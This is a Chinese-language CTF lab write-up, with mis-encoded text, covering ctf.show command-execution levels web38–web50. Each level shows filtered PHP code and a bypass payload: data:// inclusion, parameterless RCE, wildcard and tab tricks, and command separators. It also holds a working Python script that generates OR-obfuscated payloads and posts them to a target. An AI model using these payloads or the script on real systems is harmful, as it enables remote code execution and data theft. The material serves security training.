<h3 id="web38"><a class="header-anchor" href="#web38">Â¶</a>web38</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡åœ¨å‰é¢åŸºç¡€ä¸Šè¿‡æ»¤äº†phpå’Œfileï¼Œå¯¹æˆ‘ä»¬æ— ç¢ï¼Œå› ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯phpçŸ­æ ‡ç­¾ï¼Œæ‰€ä»¥ç»§ç»­ä½¿ç”¨ä¸Šé¢çš„payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="web39"><a class="header-anchor" href="#web39">Â¶</a>web39</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡å‡å°‘äº†è¿‡æ»¤ï¼Œä½†æ˜¯ä¼šå†åé¢åŠ ä¸Š.phpçš„åç¼€ï¼Œç„¶è€Œæˆ‘ä»¬å‰é¢çš„payloadç»“å°¾æ˜¯æœ‰ä¸€ä¸ª?&gt;è¿›è¡Œäº†æ ‡ç­¾é—­åˆï¼Œæ‰€ä»¥?&gt;.phpæ²¡æœ‰å½±å“ï¼Œç»§ç»­ä½¿ç”¨å‰é¢payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="web40"><a class="header-anchor" href="#web40">Â¶</a>web40</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå›åˆ°evalè¯­å¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†è¿‡æ»¤äº†è®¸å¤šä¸œè¥¿ï¼Œæ²¡æœ‰è¿‡æ»¤æ‰è‹±æ–‡çš„()ï¼Œé‚£æˆ‘ä»¬ä½¿ç”¨æ— å‚æ•°çš„rceè¿›è¡Œæ„é€ è¯»å–æ–‡ä»¶</p>
<blockquote>
<p>print_r(scandir(â€˜.â€™));      æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å</p>
<p>localeconv() 				å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚</p>
<p>current() 					  å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼ˆå•å…ƒï¼‰,é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ï¼Œposæ˜¯currentçš„åˆ«å</p>
</blockquote>
<p>æˆ‘ä»¬å…ˆæ‰“å°å‡ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web40/NHDM7A4%5BNQ%5BU3%25S%401W%60%24R2P.png" alt=""><br>
è¯»å–ç›®å½•æ–‡ä»¶åï¼Œå‘ç°è¾“å‡ºçš„æ˜¯æ•°ç»„ï¼Œè€Œæ–‡ä»¶åæ˜¯æ•°ç»„ä¸­çš„å€¼ï¼Œä¸‹ä¸€æ­¥æˆ‘ä»¬éœ€è¦å–å‡ºæƒ³è¦è¯»å–æ–‡ä»¶çš„æ•°ç»„</p>
<blockquote>
<p>each()        è¿”å›æ•°ç»„ä¸­å½“å‰çš„é”®/å€¼å¯¹å¹¶å°†æ•°ç»„æŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€æ­¥<br>
end()          å°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æœ€åä¸€ä¸ªå•å…ƒ<br>
next()         å°†æ•°ç»„ä¸­çš„å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€ä½<br>
prev()         å°†æ•°ç»„ä¸­çš„å†…éƒ¨æŒ‡é’ˆå€’å›ä¸€ä½<br>
array_reverse() 	ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„</p>
</blockquote>
<p>éœ€è¦çŸ¥è¯†ç‚¹é½äº†ï¼Œè§‚å¯Ÿflag.phpåœ¨å€’æ•°ç¬¬äºŒä½ï¼Œæˆ‘ä»¬å¼€å§‹æ„é€ </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web40/AKO6S7Q%24R_EJ%5B6Q13BEICQ9.png" alt=""></p>
<h3 id="web41"><a class="header-anchor" href="#web41">Â¶</a>web41</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿‡æ»¤äº†æ•°å­—å’Œå­—æ¯è¿˜æœ‰ä¸€äº›å…¶ä»–ç¬¦å·ï¼Œä½†æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æˆ–è¿ç®—ç¬¦è¿›è¡Œæ„é€ payloadè¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br>
æ€è·¯ï¼š</p>
<blockquote>
<p>é€šä¿—è§£é‡Šï¼š<br>
ä¾‹å¦‚æºç ä¸­ç¦æ­¢æˆ‘ä»¬ä½¿ç”¨äº†æ•°å­—3ï¼Œä¹Ÿå°±æ˜¯asciiç å€¼ä¸º51ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æˆ–è¿ç®—ç¬¦åœ¨æ²¡æœ‰è¢«ç¦æ­¢çš„å­—ç¬¦ä¸­æ„é€ å‡º51æ¥ï¼Œæ¯”å¦‚19å’Œ32æ²¡æœ‰è¢«ç¦æ­¢ï¼Œæˆ‘ä»¬è¿›è¡Œæˆ–è¿ç®—19|32=51ï¼Œå°±å¯ä»¥è·å¾—51è¿™ä¸ªasciiç å€¼ï¼Œä¹Ÿå°±æ˜¯æˆåŠŸå¾—åˆ°äº†æ•°å­—3</p>
</blockquote>
<p>çŸ¥é“äº†æ–¹æ³•åï¼Œæˆ‘ä»¬ä»asciiç è¡¨ï¼Œä¹Ÿå°±æ˜¯0-255ä¸­æ‰¾åˆ°æ²¡æœ‰è¢«è¿‡æ»¤çš„å­—ç¬¦è¿›è¡Œæˆ–è¿ç®—ï¼Œä»¥å¯»æ±‚å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦<br>
ç»“åˆäº†yuå¸ˆå‚…ç»™å‡ºçš„expï¼Œæˆ‘ä»¬å†™ä¸€ä¸ªç‹¬ç«‹çš„pythonè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/10 12:56</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span>(len(argv)!=<span class="number">2</span>):</span><br><span class="line">    print(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    print(<span class="string">&#x27;USER:python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&quot;eg:  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;exit: input exit in function&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç”Ÿæˆå¯ç”¨çš„å­—ç¬¦</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_rce</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    preg = <span class="string">&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (re.match(preg, chr(i), re.I) <span class="keyword">or</span> re.match(preg, chr(j), re.I)):</span><br><span class="line">                k = i | j</span><br><span class="line">                <span class="keyword">if</span> k &gt;= <span class="number">32</span> <span class="keyword">and</span> k &lt;= <span class="number">126</span>:</span><br><span class="line">                    a = <span class="string">&#x27;%&#x27;</span> + hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    b = <span class="string">&#x27;%&#x27;</span> + hex(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    result += (chr(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    f = open(<span class="string">&#x27;rce.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(result)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#æ ¹æ®è¾“å…¥çš„å‘½ä»¤åœ¨ç”Ÿæˆçš„txtä¸­è¿›è¡ŒåŒ¹é…</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1=<span class="string">&quot;&quot;</span></span><br><span class="line">    s2=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f=open(<span class="string">&quot;rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t=f.readline()</span><br><span class="line">            <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">                s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    write_rce()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s1 = input(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s1 == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s2 = input(<span class="string">&quot;[+] your commandï¼š&quot;</span>)</span><br><span class="line">        param=action(s1) + action(s2)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        print(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œåï¼Œè¾“å…¥å‘½ä»¤å¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web41/%7DG%40_KOG%24CK29%60OW%5BQEF%5DQMR.png" alt=""><br>
åæ¥å‘ç°å›¾ç‰‡è„šæœ¬åå­—æ‰“é”™äº†ï¼Œæ˜¯æˆ–è¿ç®—å™¢ï¼Œä¸è¦æ¦‚å¿µæ··æ·†äº†å“ˆå“ˆ</p>
<h3 id="web42"><a class="header-anchor" href="#web42">Â¶</a>web42</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡åé¢å¤šäº†ä¸€ä¸ª&quot; &gt;/dev/null 2&gt;&amp;1&quot;è¯­å¥ï¼Œæ„æ€æ˜¯å†™å…¥çš„å†…å®¹ä¼šæ°¸è¿œæ¶ˆå¤±ï¼Œä¹Ÿå°±æ˜¯ä¸è¿›è¡Œå›æ˜¾</p>
<blockquote>
<p>1ï¼š&gt; ä»£è¡¨é‡å®šå‘åˆ°å“ªé‡Œï¼Œä¾‹å¦‚ï¼šecho â€œ123â€ &gt; /home/123.txt<br>
2ï¼š/dev/null ä»£è¡¨ç©ºè®¾å¤‡æ–‡ä»¶<br>
3ï¼š2&gt; è¡¨ç¤ºstderræ ‡å‡†é”™è¯¯<br>
4ï¼š&amp; è¡¨ç¤ºç­‰åŒäºçš„æ„æ€ï¼Œ2&gt;&amp;1ï¼Œè¡¨ç¤º2çš„è¾“å‡ºé‡å®šå‘ç­‰åŒäº1<br>
5ï¼š1 è¡¨ç¤ºstdoutæ ‡å‡†è¾“å‡ºï¼Œç³»ç»Ÿé»˜è®¤å€¼æ˜¯1ï¼Œæ‰€ä»¥&quot;&gt;/dev/null&quot;ç­‰åŒäº â€œ1&gt;/dev/nullâ€<br>
å› æ­¤ï¼Œ&gt;/dev/null 2&gt;&amp;1 ä¹Ÿå¯ä»¥å†™æˆâ€œ1&gt; /dev/null 2&gt; &amp;1â€</p>
<p>é‚£ä¹ˆæœ¬æ–‡æ ‡é¢˜çš„è¯­å¥æ‰§è¡Œè¿‡ç¨‹ä¸ºï¼š<br>
1&gt;/dev/null ï¼šé¦–å…ˆè¡¨ç¤ºæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°ç©ºè®¾å¤‡æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ä¸è¾“å‡ºä»»ä½•ä¿¡æ¯åˆ°ç»ˆç«¯ï¼Œä¹Ÿå°±æ˜¯ä¸æ˜¾ç¤ºä»»ä½•ä¿¡æ¯ã€‚<br>
2&gt;&amp;1 ï¼š		æ¥ç€ï¼Œæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œå› ä¸ºä¹‹å‰æ ‡å‡†è¾“å‡ºå·²ç»é‡å®šå‘åˆ°äº†ç©ºè®¾å¤‡æ–‡ä»¶ï¼Œæ‰€ä»¥æ ‡å‡†é”™è¯¯è¾“å‡ºä¹Ÿé‡å®šå‘åˆ°ç©ºè®¾å¤‡æ–‡ä»¶ã€‚</p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¦‚æœè¾“å…¥<code>?c=ls</code>ï¼Œè¾“å‡ºå°±ä¼šè¢«åæ‰ä¸è¿›è¡Œå›æ˜¾ï¼Œé‚£è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿå…¶å®å¾ˆç®€å•ï¼Œç”¨<code>;</code>å·æˆ–è€…<code>||</code>ç­‰ç­‰ä¸€äº›å‘½ä»¤åˆ†éš”ç¬¦è¿›è¡Œå‘½ä»¤åˆ†éš”<br>
payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac flag.php;</span><br></pre></td></tr></table></figure>
<h3 id="web43"><a class="header-anchor" href="#web43">Â¶</a>web43</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨å‰é¢åŸºç¡€ä¸Šè¿‡æ»¤äº†catå’Œ;å·ï¼Œæˆ‘ä»¬ä½¿ç”¨å…¶ä»–å‘½ä»¤åˆ†éš”ç¬¦å³å¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac flag.php||</span><br></pre></td></tr></table></figure>
<h3 id="web44"><a class="header-anchor" href="#web44">Â¶</a>web44</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">f(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æŠŠflagè¿‡æ»¤äº†ï¼Œç›¸ä¿¡å¦‚æœä½ ä»å‰é¢åšåˆ°ç°åœ¨ï¼Œå¿ƒä¸­åº”è¯¥ä¹ŸçŸ¥é“æ€ä¹ˆç»•è¿‡äº†å“ˆå“ˆï¼Œä½¿ç”¨é€šé…ç¬¦è¿›è¡Œç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac fla*||</span><br></pre></td></tr></table></figure>
<h3 id="web45"><a class="header-anchor" href="#web45">Â¶</a>web45</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡æŠŠç©ºæ ¼ä¹Ÿè¿‡æ»¤äº†ï¼Œokï¼Œä½¿ç”¨%09è¿›è¡Œç»•è¿‡ï¼Œ%09æ˜¯tabçš„urlç¼–ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac%09fla*||</span><br></pre></td></tr></table></figure>
<h3 id="web46"><a class="header-anchor" href="#web46">Â¶</a>web46</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡æŠŠæ•°å­—éƒ½è¿‡æ»¤äº†ï¼Œè¿˜æŠŠé€šé…ç¬¦<code>*</code>è¿›è¡Œäº†è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥æ”¹ç”¨<code>?</code>è¿›è¡ŒåŒ¹é…ï¼ŒåŒæ—¶ç©ºæ ¼çš„è¯è¿˜æ˜¯å¯ä»¥ç»§ç»­ä½¿ç”¨%09ï¼Œå®ƒä¸å±äºè¿‡æ»¤çš„æ•°å­—èŒƒç•´</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.php||</span><br></pre></td></tr></table></figure>
<h3 id="web47"><a class="header-anchor" href="#web47">Â¶</a>web47</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡å¤šè¿‡æ»¤äº†å‡ ä¸ªè¯»å–æ–‡ä»¶çš„å‘½ä»¤ï¼Œä½†tacæ²¡æœ‰è¢«è¿‡æ»¤æˆ‘ä»¬ç»§ç»­ä½¿ç”¨ä¹‹å‰çš„payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.php||</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œè¡¥å……ä¸€ä¸‹ä¸€äº›å…¶ä»–å‘½ä»¤è¯»å–çš„æ“ä½œ</p>
<blockquote>
<p>more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹<br>
less:ä¸ more ç±»ä¼¼<br>
head:æŸ¥çœ‹å¤´å‡ è¡Œ<br>
tac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤º<br>
tail:æŸ¥çœ‹å°¾å‡ è¡Œ<br>
nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·<br>
od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹<br>
vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹<br>
vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹<br>
sort:å¯ä»¥æŸ¥çœ‹<br>
uniq:å¯ä»¥æŸ¥çœ‹<br>
file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹<br>
grep<br>
1ã€åœ¨å½“å‰ç›®å½•ä¸­ï¼ŒæŸ¥æ‰¾åç¼€æœ‰ file å­—æ ·çš„æ–‡ä»¶ä¸­åŒ…å« test å­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²çš„è¡Œã€‚æ­¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š<br>
grep test *file<br>
strings</p>
</blockquote>
<h3 id="web48"><a class="header-anchor" href="#web48">Â¶</a>web48</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡è¿˜æ˜¯å¤šè¿‡æ»¤äº†ä¸€äº›è¯»å–çš„å‘½ä»¤ï¼Œtacæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œç»§ç»­ä½¿ç”¨å‰é¢çš„payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.php||</span><br></pre></td></tr></table></figure>
<h3 id="web49"><a class="header-anchor" href="#web49">Â¶</a>web49</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿˜æ˜¯æ²¡æœ‰è¿‡æ»¤tacï¼Œç»§ç»­ä½¿ç”¨å‰é¢çš„payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.php||</span><br></pre></td></tr></table></figure>
<h3 id="web50"><a class="header-anchor" href="#web50">Â¶</a>web50</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
